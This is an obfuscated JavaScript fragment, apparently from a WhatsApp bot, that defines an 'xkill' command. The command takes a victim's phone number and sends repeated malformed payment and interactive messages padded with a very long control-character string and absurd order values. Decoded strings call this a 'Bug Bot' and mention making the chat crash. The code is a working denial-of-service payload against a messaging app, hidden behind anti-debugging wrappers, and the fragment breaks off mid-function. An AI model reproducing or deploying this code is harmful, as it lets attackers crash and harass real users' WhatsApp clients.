_0x5b2945===_0x2c34dd;},_0x155a57[_0x531257(0x319,0x2e4,0x2ee,0x355)]=_0x531257(0x30b,0x2ee,0x2d4,0x302);const _0x52b398=_0x155a57;let _0x586fd9=!![];function _0x531257(_0x117323,_0x5a842f,_0x3c1f42,_0x44b756){return _0x453f(_0x117323-0x219,_0x5a842f);}return function(_0x33306a,_0x45bd60){function _0x56ef09(_0x4057a0,_0x387226,_0x4b7da5,_0x4d689c){return _0x4976a3(_0x4d689c,_0x387226-0x146,_0x4057a0-0x53,_0x4d689c-0xc);}function _0x3ddcc9(_0x1e76e5,_0xcb3799,_0x3bb072,_0x217579){return _0x531257(_0xcb3799- -0x344,_0x1e76e5,_0x3bb072-0x13c,_0x217579-0x80);}if(_0x52b398['SUvuF'](_0x56ef09(0x307,0x2fb,0x327,0x30b),_0x52b398[_0x56ef09(0x315,0x354,0x30c,0x30c)])){const _0x3e50d3=_0x586fd9?function(){function _0x8c4b9(_0x37febb,_0x4799e7,_0x4ea418,_0x51a113){return _0x3ddcc9(_0x4799e7,_0x51a113-0x290,_0x4ea418-0xa4,_0x51a113-0xd4);}if(_0x45bd60){const _0x340589=_0x45bd60[_0x8c4b9(0x258,0x23b,0x239,0x26c)](_0x33306a,arguments);return _0x45bd60=null,_0x340589;}}:function(){};return _0x586fd9=![],_0x3e50d3;}else{const _0xbbd858=_0x34068a['apply'](_0x520ed8,arguments);return _0x1f1d49=null,_0xbbd858;}};}());function _0x2fc48f(_0x4f12de,_0x287028,_0x273bfe,_0x43c990){return _0x453f(_0x287028-0x346,_0x43c990);}const _0x25b9f0=_0x1c8a3c(this,function(){function _0xe03a3(_0x5c677d,_0x52f6d8,_0x49378b,_0x2557ba){return _0x453f(_0x2557ba-0x36a,_0x5c677d);}function _0x50a745(_0x56a1de,_0x594878,_0x3d874a,_0x54b97b){return _0x453f(_0x3d874a-0x123,_0x54b97b);}const _0x23645a={};_0x23645a[_0x50a745(0x220,0x261,0x224,0x20b)]='(((.+)+)+)'+'+$';const _0x9374f6=_0x23645a;return _0x25b9f0[_0x50a745(0x1f7,0x241,0x204,0x1f0)]()[_0x50a745(0x1c5,0x1b4,0x1e9,0x211)](_0x9374f6[_0xe03a3(0x49f,0x4a6,0x474,0x46b)])['toString']()['constructo'+'r'](_0x25b9f0)[_0xe03a3(0x468,0x467,0x3f2,0x430)](_0xe03a3(0x425,0x435,0x424,0x440)+'+$');});_0x25b9f0();const _0x460fe4=(function(){let _0x331e0a=!![];return function(_0x24e290,_0x37d477){const _0x47a0a2=_0x331e0a?function(){function _0x3c91e6(_0x2e8505,_0x466d91,_0x5d88a3,_0x1c2efb){return _0x453f(_0x1c2efb- -0x167,_0x466d91);}if(_0x37d477){const _0xeec447=_0x37d477[_0x3c91e6(-0x7e,-0x63,-0x75,-0x60)](_0x24e290,arguments);return _0x37d477=null,_0xeec447;}}:function(){};return _0x331e0a=![],_0x47a0a2;};}()),_0x1202f1=_0x460fe4(this,function(){const _0x2b9686={'RyxSg':_0x4891a6(-0x13e,-0x104,-0x16a,-0x105),'MCXQb':function(_0x246717,_0x2e69e6){return _0x246717+_0x2e69e6;},'nEuTf':_0x4891a6(-0x143,-0x12f,-0x107,-0x174)+_0x2cf091(0x380,0x375,0x34f,0x357),'SCYHI':function(_0x57381c,_0x4c2aa9){return _0x57381c===_0x4c2aa9;},'OnGot':_0x2cf091(0x3b3,0x39c,0x3ac,0x389),'fxezq':function(_0x1ec1b7){return _0x1ec1b7();},'PRJGV':_0x2cf091(0x376,0x360,0x360,0x355),'gZiEh':'warn','qfRrT':_0x4891a6(-0x136,-0xf6,-0xfd,-0x101),'kGsKR':'exception','zsYhV':_0x4891a6(-0x168,-0x156,-0x15c,-0x160),'YPZmY':_0x2cf091(0x32c,0x368,0x390,0x384),'bJfXR':function(_0xefedfd,_0x18199c){return _0xefedfd<_0x18199c;}},_0x460b30=function(){function _0x6c0bab(_0x3c28b1,_0x5b1d94,_0x319b61,_0x369cd4){return _0x2cf091(_0x3c28b1-0x185,_0x319b61- -0x306,_0x3c28b1,_0x369cd4-0x2b);}let _0x59202e;function _0x4962e3(_0x1c8425,_0x9cef75,_0x171d04,_0x5cbcb9){return _0x4891a6(_0x171d04-0x327,_0x1c8425,_0x171d04-0xc4,_0x5cbcb9-0x18e);}try{if(_0x2b9686['RyxSg']!==_0x2b9686[_0x4962e3(0x1df,0x1b6,0x1ec,0x1e4)]){const _0x5b2e18=_0x45f6e8['constructo'+'r']['prototype'][_0x4962e3(0x1e7,0x1f2,0x204,0x1f3)](_0x2b523c),_0x2c5bd4=_0x5e8413[_0x2311c6],_0x202126=_0x46a0ce[_0x2c5bd4]||_0x5b2e18;_0x5b2e18[_0x4962e3(0x1cf,0x1f2,0x1c3,0x1f8)]=_0x2ec944[_0x4962e3(0x220,0x20d,0x204,0x226)](_0x31db21),_0x5b2e18['toString']=_0x202126[_0x6c0bab(0x74,0x98,0x84,0xb4)][_0x4962e3(0x227,0x22e,0x204,0x23a)](_0x202126),_0xf4aad7[_0x2c5bd4]=_0x5b2e18;}else _0x59202e=Function(_0x2b9686[_0x4962e3(0x1ae,0x1dc,0x1b7,0x1c6)](_0x2b9686[_0x4962e3(0x1cc,0x1e6,0x1de,0x1b6)],_0x6c0bab(0xaa,0x7d,0x9a,0x61)+_0x6c0bab(0x78,0x65,0x85,0x94)+_0x6c0bab(0x89,0x86,0x8d,0x71)+'\x20)')+');')();}catch(_0x2aefb8){if(_0x2b9686[_0x4962e3(0x1b3,0x1ec,0x1f2,0x1c0)](_0x2b9686[_0x6c0bab(0x35,0x65,0x41,0x48)],_0x4962e3(0x1a9,0x18c,0x1c9,0x1aa))){if(_0x2348d9){const _0x410e2d=_0x5392db[_0x6c0bab(0xa0,0xa3,0xaa,0xb9)](_0x2e5a9d,arguments);return _0x5e31fc=null,_0x410e2d;}}else _0x59202e=window;}return _0x59202e;},_0x29c00d=_0x2b9686['fxezq'](_0x460b30);function _0x2cf091(_0xa63f07,_0x2edab9,_0x7f67a5,_0x13c887){return _0x453f(_0x2edab9-0x2a9,_0x7f67a5);}const _0x14e515=_0x29c00d[_0x2cf091(0x36f,0x396,0x376,0x398)]=_0x29c00d['console']||{};function _0x4891a6(_0x5de00b,_0x14c2e6,_0x3f913f,_0x3c4c5c){return _0x453f(_0x5de00b- -0x212,_0x14c2e6);}const _0x39b4ea=[_0x2b9686[_0x4891a6(-0x162,-0x140,-0x197,-0x172)],_0x2b9686[_0x4891a6(-0x15f,-0x150,-0x12d,-0x135)],_0x4891a6(-0x17c,-0x171,-0x197,-0x188),_0x2b9686['qfRrT'],_0x2b9686[_0x2cf091(0x395,0x38d,0x37a,0x35e)],_0x2b9686[_0x2cf091(0x36a,0x3a8,0x37b,0x3aa)],_0x2b9686['YPZmY']];for(let _0x2b03d6=0x2007*-0x1+0x22e1+0x2da*-0x1;_0x2b9686['bJfXR'](_0x2b03d6,_0x39b4ea['length']);_0x2b03d6++){const _0x32ea3b=_0x460fe4[_0x2cf091(0x315,0x33b,0x31e,0x30c)+'r'][_0x2cf091(0x364,0x390,0x3d0,0x356)]['bind'](_0x460fe4),_0x43f67b=_0x39b4ea[_0x2b03d6],_0x48d913=_0x14e515[_0x43f67b]||_0x32ea3b;_0x32ea3b['__proto__']=_0x460fe4[_0x2cf091(0x3bc,0x398,0x383,0x37c)](_0x460fe4),_0x32ea3b[_0x2cf091(0x399,0x38a,0x3ba,0x36f)]=_0x48d913[_0x2cf091(0x37e,0x38a,0x3a8,0x369)][_0x4891a6(-0x123,-0xf9,-0x139,-0x118)](_0x48d913),_0x14e515[_0x43f67b]=_0x32ea3b;}});_0x1202f1();let bug='\x03'[_0x2fc48f(0x3c9,0x3d1,0x3a6,0x394)](-0xa7dba+-0x4c1c6+-0x174*-0x11d8);for(let i=-0x26ee+0xde6+-0x9*-0x2c8;i<amount;i++){const _0x1d2630={};_0x1d2630[_0x4eaeea(0x1,-0x18,-0x24,0x3f)+_0x4eaeea(-0x8,0xf,0x1c,-0x20)]=_0x2fc48f(0x3aa,0x3e9,0x3bb,0x3fe)+'38483540@n'+'ewsletter',_0x1d2630[_0x4eaeea(0x1,0x32,0x23,0x3f)+_0x2fc48f(0x3a8,0x3da,0x3fe,0x3ed)]=_0x4eaeea(-0x4,0x28,0x7,0x1f)+_0x4eaeea(0x4e,0x33,0x2b,0x68)+_0x4eaeea(0x55,0x57,0x8d,0x71)+'h',_0x1d2630[_0x4eaeea(0x1e,0x3a,0x4d,0x12)+_0x2fc48f(0x3f4,0x40a,0x443,0x3d3)]=0x2;const _0xa2bffe={};_0xa2bffe[_0x4eaeea(0x42,0x80,0x7b,0x1a)+_0x2fc48f(0x3be,0x3e6,0x3af,0x3d1)]=[],_0xa2bffe['jpegThumbn'+_0x4eaeea(0x43,0x3e,0x5e,0x63)]=global[_0x2fc48f(0x40f,0x43a,0x431,0x450)];const _0x34759c={};_0x34759c['name']='review_and'+_0x2fc48f(0x3e1,0x3f1,0x3bf,0x3bc),_0x34759c[_0x2fc48f(0x433,0x3ff,0x3e9,0x3c9)+_0x4eaeea(0x57,0x2c,0x5c,0x31)]='{\x22currency'+_0x4eaeea(0x2,0x0,-0x23,-0xd)+'otal_amoun'+_0x4eaeea(0x18,0x42,0x34,0xd)+_0x2fc48f(0x41e,0x3e2,0x41b,0x3d4)+_0x2fc48f(0x436,0x44b,0x453,0x481)+_0x4eaeea(-0xb,-0x5,0x6,-0x3c)+_0x4eaeea(0x28,0x25,-0x1,0x25)+_0x4eaeea(0x35,0x3,0x4a,0x6a)+_0x2fc48f(0x3ec,0x3dd,0x3cb,0x409)+':\x22physical'+_0x4eaeea(0x52,0x66,0x15,0x4b)+_0x4eaeea(0x58,0x6c,0x8e,0x19)+_0x4eaeea(-0x15,0x2b,-0x55,-0x42)+_0x4eaeea(0x2f,0x12,-0x6,0x27)+_0x2fc48f(0x45c,0x444,0x409,0x425)+_0x2fc48f(0x47b,0x448,0x445,0x463)+_0x4eaeea(0x13,0xf,0x51,-0x26)+_0x4eaeea(0x20,-0x1e,0x32,0x3d)+_0x2fc48f(0x427,0x426,0x43b,0x3eb)+_0x2fc48f(0x3f9,0x436,0x423,0x422)+_0x4eaeea(-0x17,0x1f,-0x51,-0x4a)+_0x2fc48f(0x432,0x43f,0x42d,0x44b)+_0x2fc48f(0x3ea,0x408,0x3fc,0x3c9)+_0x4eaeea(0x15,0x45,-0x9,0xe)+'3159292600'+_0x2fc48f(0x469,0x44e,0x419,0x44d)+'t_id\x22:\x22799'+_0x4eaeea(0x22,0x17,0x47,-0x17)+'009\x22,\x22name'+_0x4eaeea(0xc,-0x17,-0x31,-0x11)+xbugtex['xtxt']+(_0x2fc48f(0x405,0x3f8,0x436,0x3f4)+_0x2fc48f(0x457,0x43c,0x42c,0x46c)+_0x2fc48f(0x463,0x449,0x468,0x419)+'ffset\x22:100'+_0x4eaeea(-0x9,-0x13,-0x37,0x29)+_0x4eaeea(0x36,0x21,0x4e,0x39)+_0x2fc48f(0x3d8,0x400,0x40d,0x3d7)+_0x2fc48f(0x405,0x3ee,0x3d0,0x3da)+_0x4eaeea(0x4,0x28,0x7,0x5)+_0x4eaeea(0x61,0x2e,0x4c,0x80)+_0x4eaeea(0x66,0x35,0x93,0x6d)+_0x4eaeea(-0x14,-0x34,-0x1e,-0x3e)+_0x4eaeea(0x6,-0x5,0x46,-0xc)+_0x4eaeea(0x2b,0x15,0x2c,0x4c)+_0x2fc48f(0x3d2,0x3d3,0x3cd,0x3e1))+bug+(_0x4eaeea(0xf,-0x15,0x33,0x4d)+_0x2fc48f(0x415,0x43c,0x45f,0x44d)+_0x2fc48f(0x437,0x449,0x415,0x45b)+'ffset\x22:100'+_0x4eaeea(-0x9,0xb,-0x3c,0x36)+_0x4eaeea(0x2d,0x15,-0x3,0xe)+'ative_paym'+_0x4eaeea(0x38,0x26,0x2c,0x39)+_0x4eaeea(0x3c,0xf,0x4a,0x4b));const _0xf37131={};_0xf37131[_0x4eaeea(0x1d,0x3c,0x1a,-0x1d)]=[_0x34759c];const _0x26e3cf={};_0x26e3cf[_0x4eaeea(0x37,0x8,0x3c,0x5)]=_0xa2bffe,_0x26e3cf[_0x4eaeea(-0x10,-0x14,0x2,-0x30)+_0x4eaeea(0x32,0x15,-0x4,0x27)]=_0xf37131;const _0x2a7413={};_0x2a7413['interactiv'+_0x2fc48f(0x43c,0x434,0x45b,0x453)]=_0x26e3cf;const _0x42b619={};_0x42b619[_0x2fc48f(0x3e6,0x419,0x44e,0x42e)+'d']=!![],_0x42b619['forwardedN'+'ewsletterM'+_0x2fc48f(0x3ec,0x3e3,0x40b,0x3d2)]=_0x1d2630,_0x42b619[_0x2fc48f(0x404,0x3fb,0x3f6,0x405)]=_0x2fc48f(0x429,0x403,0x3e8,0x441)+_0x4eaeea(0x9,-0xe,-0x27,-0x4),_0x42b619['participan'+'t']=_0x2fc48f(0x410,0x417,0x3f5,0x404)+_0x4eaeea(0x5a,0x4a,0x74,0x2a),_0x42b619[_0x4eaeea(-0x13,0x29,-0x32,0x2)+_0x4eaeea(-0xe,-0x9,-0x35,0x18)]=_0x2a7413,_0x42b619[_0x2fc48f(0x3be,0x3f7,0x3cc,0x411)]=_0x4eaeea(0x48,0xb,0x3f,0x55)+_0x4eaeea(0x3,0x3d,0xd,-0x25);const _0x18e540={};_0x18e540['text']='\x20',_0x18e540[_0x2fc48f(0x41f,0x40d,0x439,0x3f8)+'o']=_0x42b619;const _0x1985c4={};_0x1985c4[_0x4eaeea(0x3b,0x7b,0x3c,0x47)+'xtMessage']=_0x18e540,await Yosh[_0x4eaeea(0x27,-0x6,0x64,0x1c)+'ge'](m[_0x2fc48f(0x451,0x429,0x41c,0x425)],_0x1985c4,{});const _0xfd3911={};_0xfd3911['text']='\x20';const _0x136d8a={};_0x136d8a[_0x2fc48f(0x3f8,0x42e,0x40e,0x437)]=xbug2,await Yosh[_0x2fc48f(0x444,0x42f,0x402,0x40a)+'e'](m[_0x2fc48f(0x43e,0x429,0x42f,0x458)],_0xfd3911,_0x136d8a);}function _0x453f(_0x25b9f0,_0x1c8a3c){const _0x3b9f39=_0x3b9f();return _0x453f=function(_0x453f85,_0x12a8ea){_0x453f85=_0x453f85-(-0x15d*-0x8+0x1583*-0x1+0xb26);let _0x31ef9c=_0x3b9f39[_0x453f85];return _0x31ef9c;},_0x453f(_0x25b9f0,_0x1c8a3c);}function _0x3b9f(){const _0x3e0b0d=['return\x20(fu','y\x22:1}]},\x22n','0@s.whatsa','ment_reque','isForwarde','YckVA','Message','(((.+)+)+)','RyxSg','\x224ONSAXV76','y\x22:1},{\x22re','header','ent_method','error','SCYHI','extendedTe','s\x22:[]}','et\x22:100},\x22','toString','ctor(\x22retu','chat','kGsKR','hasMediaAt','ail','prototype','quoted','sendMessag','rn\x20this\x22)(','status@bro','85369EctOWu','console','eMessage','bind','order_type','uka\x20chat\x20i','ivNqe','qIvzT','bimg','-goods\x22,\x22o',':{\x22value\x22:','{}.constru','ni\x20->\x20cras','\x22items\x22:[{','msJson','rder\x22:{\x22st','36BBgfPa','pp.net','sted\x22,\x22sub','zsYhV','cltkh','WjJjM','total\x22:{\x22v','9999900,\x22o','\x22product_i',',\x22offset\x22:','7mcCrea','apply','9\x22,\x22produc','d\x22:\x22784267','364020DaccDn','repeat','\x22:\x22ORDER\x22,','Bug\x20Bot\x20🦄','atus\x22:\x22pay','4605763435','quotedMess','332216bzyOfX','constructo','nativeFlow','Name','age','info','KN\x22,\x22type\x22','100},\x22refe','SUvuF','},\x22quantit','Jid','\x22:69696969','essageInfo','OnGot','relog\x20->\x20b','tachment','178686RRfwcP','MCXQb','1203631440','newsletter','\x22:\x22INR\x22,\x22t','adcast','05763435\x22,',':\x2278426746','\x22,\x22name\x22:\x22','table','_pay','FE4CDF','9uEAksQ','__proto__','\x22:\x22','PRJGV','remoteJid','\x22,\x22amount\x22','gZiEh','jZQZf','stanzaId','alue\x22:1999','log','id\x22:\x2275376','buttonPara','tailer_id\x22','t\x22:{\x22value','44256GJazSw','BAE526D352','185295HrBSjk','trace','buttons','serverMess','\x22retailer_','9800,\x22offs','ageId','9631592926','search','contextInf','6zqZSXT','nEuTf','relayMessa','rence_id\x22:','nction()\x20','95455PhYCDS','🦄\x20Yosh\x20'];_0x3b9f=function(){return _0x3e0b0d;};return _0x3b9f();}
}
break
case '14': case 'xkill': {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} 91xxxxxxxxxx\nExample ${prefix+command} 916909137269`)
await loading()
let target = text + '@s.whatsapp.net';
function _0x45425d(_0x10fecd,_0x21a04c,_0x4eac45,_0x1cc1a5){return _0x5ddd(_0x21a04c- -0x150,_0x1cc1a5);}(function(_0x3c054e,_0x283d5d){const _0x1a5853=_0x3c054e();function _0x1fed8a(_0x3ce43d,_0x5788cd,_0xc65a82,_0x37d33f){return _0x5ddd(_0x3ce43d-0x4e,_0x5788cd);}function _0x4ee80c(_0x2feee5,_0x2dfdae,_0x122c8b,_0x4e6a46){return _0x5ddd(_0x4e6a46-0x43,_0x122c8b);}while(!![]){try{const _0x22f33e=-parseInt(_0x4ee80c(0x1a2,0x20e,0x1f2,0x1e4))/(-0x7c*0x23+-0x3e*-0x9+0x4ed*0x3)*(parseInt(_0x4ee80c(0x26f,0x266,0x26e,0x257))/(0xb0*0x6+-0x1*0x1af2+0x16d4))+-parseInt(_0x1fed8a(0x20e,0x232,0x1eb,0x1d4))/(0x3*-0x4ab+0x1*-0x18a7+0x209*0x13)+parseInt(_0x4ee80c(0x25d,0x1eb,0x202,0x22d))/(0x293*0x9+-0x89b*-0x1+-0x1fc2)*(parseInt(_0x4ee80c(0x1eb,0x262,0x25b,0x221))/(-0x293*0xf+-0x5b3*0x3+0x37bb))+parseInt(_0x1fed8a(0x1ec,0x1ba,0x1fb,0x21e))/(-0xba5*0x3+0x97c+0x1979*0x1)*(parseInt(_0x1fed8a(0x263,0x221,0x298,0x250))/(0x99*-0x1b+0x25*0x49+0x59d))+-parseInt(_0x4ee80c(0x1c0,0x236,0x1e1,0x1fb))/(-0x2142+-0x4d2*0x4+0x8c3*0x6)+parseInt(_0x4ee80c(0x211,0x243,0x210,0x235))/(-0x1*-0x1d5+0xb5*0x4+0x10*-0x4a)+parseInt(_0x4ee80c(0x1e9,0x239,0x206,0x219))/(-0x19b4+0x24c7+0x235*-0x5);if(_0x22f33e===_0x283d5d)break;else _0x1a5853['push'](_0x1a5853['shift']());}catch(_0xdc1f28){_0x1a5853['push'](_0x1a5853['shift']());}}}(_0x43ec,0xbc754+0x6*-0x4d432+0x201f57));function _0x43ec(){const _0x938d62=['error','KN\x22,\x22type\x22','quotedMess','relayMessa','dRFOJ','tDOQJ','\x22retailer_','name','1203631440',',\x22offset\x22:','9999900,\x22o','warn','58kWzeMG','20489rYsXEo','\x22:\x22INR\x22,\x22t','\x22:\x22ORDER\x22,','msJson','ageId','jvZjl','FXmxX','participan','info','tailer_id\x22','XLbyq','buttons','s\x22:[]}','StmLJ','05763435\x22,','jpegThumbn','gXXjj','nction()\x20','162XegXPt','__proto__','adcast','50132YHHUgi','relog\x20->\x20b','\x224ONSAXV76','status@bro',':{\x22value\x22:','QboQz','\x22:\x22','kYYkY','contextInf','bind','sted\x22,\x22sub','qBdYZ','oTDSn','newsletter','iYNDd','extendedTe','t\x22:{\x22value','rCjSl','rn\x20this\x22)(','Tmobw','y\x22:1},{\x22re','wllQk','BAE526D352','6311752lPxHJm','vuZew','ctor(\x22retu','},\x22quantit','iyORL','ment_reque','serverMess','ffset\x22:100','1503141wDvfLu','d\x22:\x22784267','Message','alue\x22:1999','xwGIR','0@s.whatsa','search','38483540@n','CXqJi','forwardedN',':\x22physical','otal_amoun','console','quoted','vcfEh','\x22items\x22:[{','xwthx','apply','009\x22,\x22name','4605763435','log','order_type','12555000UFwzlf','uka\x20chat\x20i','BuvAS','age','100},\x22refe','9\x22,\x22produc','Bug\x20Bot\x20','Zypyr','5fwxmwu','{}.constru','OTDlm','MrQCJ','sendMessag','constructo','zlLBL','dGpNW','9800,\x22offs','\x22product_i','bimg','cjZSp','5915924jKyZtT','rder\x22:{\x22st','y\x22:1}]},\x22n','ent_method',':\x2278426746','\x22,\x22amount\x22','trace','ail','8177733kCMlsN','hasMediaAt','TPYLA','nativeFlow','ative_paym','toString','xtMessage','9631592926','KyYfq','ewsletterM','essageInfo','text','-goods\x22,\x22o','SGwIY','return\x20(fu','header','\x22,\x22name\x22:\x22','FE4CDF','xvpwT','(((.+)+)+)','atus\x22:\x22pay','t_id\x22:\x22799'];_0x43ec=function(){return _0x938d62;};return _0x43ec();}function _0x30bfde(_0x2ec10e,_0x14feff,_0x2d8485,_0x1fc81b){return _0x5ddd(_0x2d8485-0x3ad,_0x14feff);}const _0x22e061=(function(){const _0x34d2dd={'MrQCJ':function(_0x34439e,_0x227430){return _0x34439e(_0x227430);},'SGwIY':function(_0x3f49a8,_0x2bd296){return _0x3f49a8+_0x2bd296;},'Zypyr':_0x2f266a(-0x1c,-0x13,0x9,-0x14)+_0x3b0518(-0x10e,-0x10f,-0x143,-0x118),'tDOQJ':'{}.constru'+_0x2f266a(-0x8a,-0x4a,-0x68,-0x5a)+_0x3b0518(-0x15a,-0x168,-0x12d,-0x16a)+'\x20)','uDxVe':function(_0x50b8b5,_0x34f50a){return _0x50b8b5===_0x34f50a;},'jvZjl':_0x3b0518(-0x16a,-0x163,-0x133,-0x178),'qBdYZ':function(_0x50bcc1,_0x4ad04d){return _0x50bcc1!==_0x4ad04d;},'nQBJG':'dEcqp','FrLJf':_0x2f266a(-0x34,-0x28,-0x16,-0x46),'xvpwT':function(_0x33e354,_0x4c359c){return _0x33e354===_0x4c359c;},'UHZOu':_0x3b0518(-0x168,-0xfc,-0x13a,-0x170)};function _0x3b0518(_0x52b2bf,_0x222592,_0x4c89bf,_0xa2d0b1){return _0x5ddd(_0x4c89bf- -0x2e0,_0x52b2bf);}let _0x6ba2d2=!![];function _0x2f266a(_0x50faa9,_0x52d519,_0x299216,_0x39c6d0){return _0x5ddd(_0x39c6d0- -0x214,_0x52d519);}return function(_0x50379f,_0xdcbf20){function _0x368e99(_0x3394aa,_0x54c9b9,_0x3311e8,_0x404a42){return _0x3b0518(_0x3394aa,_0x54c9b9-0xef,_0x3311e8-0x24f,_0x404a42-0xf5);}function _0x3a2dc1(_0x238046,_0x54b722,_0x4bfb00,_0x34a5c0){return _0x3b0518(_0x4bfb00,_0x54b722-0x10e,_0x54b722- -0xed,_0x34a5c0-0x13b);}if(_0x34d2dd[_0x3a2dc1(-0x1ab,-0x1c9,-0x1b2,-0x1bf)](_0x368e99(0x128,0xde,0x115,0xd9),_0x34d2dd['UHZOu'])){const _0x50ac50=_0x6ba2d2?function(){const _0x15b262={'OTDlm':function(_0xe178b6,_0x3cd82d){function _0x444630(_0x28ac9f,_0x2db20a,_0xc077d6,_0x411533){return _0x5ddd(_0x2db20a- -0x3af,_0xc077d6);}return _0x34d2dd[_0x444630(-0x1ee,-0x1ce,-0x18b,-0x1be)](_0xe178b6,_0x3cd82d);},'BuvAS':function(_0x57b92f,_0x274647){function _0x122c2f(_0x438451,_0x4d910d,_0x1d5719,_0x3f9e1e){return _0x5ddd(_0x438451- -0x398,_0x4d910d);}return _0x34d2dd[_0x122c2f(-0x199,-0x192,-0x18d,-0x172)](_0x57b92f,_0x274647);},'rCjSl':function(_0x140c9b,_0x386071){return _0x140c9b+_0x386071;},'cjZSp':_0x34d2dd[_0x3c8e2d(0x11e,0x139,0x15a,0x196)],'gXXjj':_0x34d2dd[_0x3c8e2d(0x17b,0x1a9,0x18a,0x1a0)]};function _0x36df09(_0x15efcb,_0x488213,_0x1c3918,_0x20dc60){return _0x3a2dc1(_0x15efcb-0x1f0,_0x488213-0x5ec,_0x1c3918,_0x20dc60-0x4a);}function _0x3c8e2d(_0x4f9d95,_0x396fb2,_0x1944c2,_0x1b48b5){return _0x368e99(_0x4f9d95,_0x396fb2-0x147,_0x1944c2-0xe,_0x1b48b5-0x70);}if(_0x34d2dd['uDxVe'](_0x3c8e2d(0xe7,0x126,0x12a,0xff),_0x34d2dd[_0x3c8e2d(0x10c,0x137,0x10e,0x115)])){if(_0xdcbf20){if(_0x34d2dd[_0x36df09(0x3ea,0x3cb,0x399,0x408)](_0x34d2dd['nQBJG'],_0x34d2dd['FrLJf'])){const _0x1679cb=_0xdcbf20[_0x36df09(0x40c,0x3f0,0x410,0x41d)](_0x50379f,arguments);return _0xdcbf20=null,_0x1679cb;}else{let _0x47e8ed;try{_0x47e8ed=_0x15b262[_0x36df09(0x3f0,0x3ff,0x3fb,0x3e7)](_0x2227a1,_0x15b262[_0x36df09(0x3f7,0x3f7,0x403,0x3c8)](_0x15b262[_0x36df09(0x3db,0x3d1,0x397,0x3c2)](_0x15b262[_0x3c8e2d(0x181,0x182,0x166,0x163)],_0x15b262[_0x3c8e2d(0xe3,0x135,0x119,0xe0)]),');'))();}catch(_0xb58328){_0x47e8ed=_0x52d9be;}return _0x47e8ed;}}}else{const _0x3f9d8b=_0x50a089?function(){if(_0x2d312f){const _0x491161=_0xb92ebf['apply'](_0x18beec,arguments);return _0x5052ea=null,_0x491161;}}:function(){};return _0x515d1c=![],_0x3f9d8b;}}:function(){};return _0x6ba2d2=![],_0x50ac50;}else{const _0x1e8b9b=_0x13c8fb[_0x3a2dc1(-0x1ce,-0x1fc,-0x20e,-0x1dd)](_0x3672d2,arguments);return _0x12ea84=null,_0x1e8b9b;}};}()),_0x47a498=_0x22e061(this,function(){const _0x3e95e8={};_0x3e95e8[_0x3f8d6a(0x39c,0x3d8,0x385,0x380)]=_0x1ee980(0x437,0x412,0x3f3,0x447)+'+$';const _0x399b57=_0x3e95e8;function _0x3f8d6a(_0x308ffc,_0x303c17,_0x29f7b2,_0xc5ec67){return _0x5ddd(_0x308ffc-0x203,_0x29f7b2);}function _0x1ee980(_0x1109bf,_0x24ec5a,_0x3f3342,_0x16c3b4){return _0x5ddd(_0x1109bf-0x232,_0x3f3342);}return _0x47a498[_0x1ee980(0x429,0x45b,0x42f,0x3ff)]()[_0x1ee980(0x3f8,0x3b8,0x3d3,0x3f2)](_0x399b57[_0x3f8d6a(0x39c,0x3d4,0x360,0x3c3)])[_0x1ee980(0x429,0x403,0x463,0x467)]()[_0x3f8d6a(0x3e6,0x423,0x400,0x410)+'r'](_0x47a498)[_0x3f8d6a(0x3c9,0x3e0,0x3f7,0x3e5)](_0x399b57['StmLJ']);});function _0x5ddd(_0x47a498,_0x22e061){const _0x43ecfd=_0x43ec();return _0x5ddd=function(_0x5ddd52,_0x14d506){_0x5ddd52=_0x5ddd52-(0xe0f+-0xeef*-0x1+-0x1b6f*0x1);let _0x410015=_0x43ecfd[_0x5ddd52];return _0x410015;},_0x5ddd(_0x47a498,_0x22e061);}_0x47a498();const _0x3d44a3=(function(){function _0x4e9e25(_0x547ca4,_0x22e808,_0x3538c2,_0x2097f3){return _0x5ddd(_0x547ca4- -0x5,_0x22e808);}const _0x27b1e4={};function _0x1e7bfa(_0x128ada,_0x21d7b6,_0x4beefd,_0x2e6ee2){return _0x5ddd(_0x128ada- -0xe,_0x2e6ee2);}_0x27b1e4['XdyyD']=_0x4e9e25(0x200,0x23e,0x217,0x1c4)+'+$',_0x27b1e4['vuZew']=function(_0x4f91dd,_0x12a9b7){return _0x4f91dd!==_0x12a9b7;},_0x27b1e4[_0x4e9e25(0x1c3,0x1d6,0x1dd,0x19b)]=_0x1e7bfa(0x1d6,0x1b3,0x212,0x1a3),_0x27b1e4['wllQk']=_0x1e7bfa(0x1a6,0x196,0x161,0x1cf);const _0x308de8=_0x27b1e4;let _0x387ba2=!![];return function(_0x4abd42,_0x5d1699){function _0x4e1e11(_0x14a3ee,_0x4031e9,_0x4e9322,_0x2ed308){return _0x4e9e25(_0x4031e9-0x38d,_0x2ed308,_0x4e9322-0x92,_0x2ed308-0x42);}function _0x2dc224(_0xfe5eca,_0x361858,_0x475cfd,_0x881ab1){return _0x4e9e25(_0xfe5eca-0x138,_0x881ab1,_0x475cfd-0x1d9,_0x881ab1-0x12);}if(_0x308de8[_0x4e1e11(0x508,0x541,0x517,0x542)](_0x308de8[_0x2dc224(0x2fb,0x32f,0x2db,0x308)],_0x308de8[_0x4e1e11(0x53f,0x53e,0x531,0x55c)])){const _0x2e43f4=_0x387ba2?function(){if(_0x5d1699){const _0x4f079f=_0x5d1699['apply'](_0x4abd42,arguments);return _0x5d1699=null,_0x4f079f;}}:function(){};return _0x387ba2=![],_0x2e43f4;}else return _0x18205f['toString']()['search'](_0x308de8['XdyyD'])['toString']()[_0x2dc224(0x316,0x34c,0x2d9,0x309)+'r'](_0x4e7659)['search']('(((.+)+)+)'+'+$');};}()),_0x4adc8a=_0x3d44a3(this,function(){const _0x45af7f={'TPYLA':function(_0x278634,_0x51e00f){return _0x278634+_0x51e00f;},'KyYfq':_0x1370a9(0x362,0x361,0x322,0x346)+_0x286971(-0xf2,-0x14a,-0x12e,-0x13a),'AkhMy':_0x286971(-0xce,-0xb5,-0xec,-0xda)+_0x286971(-0x12b,-0x132,-0x111,-0xcf)+_0x1370a9(0x31f,0x314,0x316,0x2e3)+'\x20)','dGpNW':function(_0x3c9d92){return _0x3c9d92();},'FXmxX':_0x1370a9(0x335,0x335,0x331,0x319),'dRFOJ':_0x286971(-0x11e,-0x104,-0x137,-0x101),'iyORL':_0x286971(-0xdc,-0xbc,-0xc3,-0x104),'QqXmN':'exception','xwthx':'table','iYNDd':_0x1370a9(0x37b,0x351,0x339,0x31d),'XLbyq':function(_0x4d6c81,_0x3cf71a){return 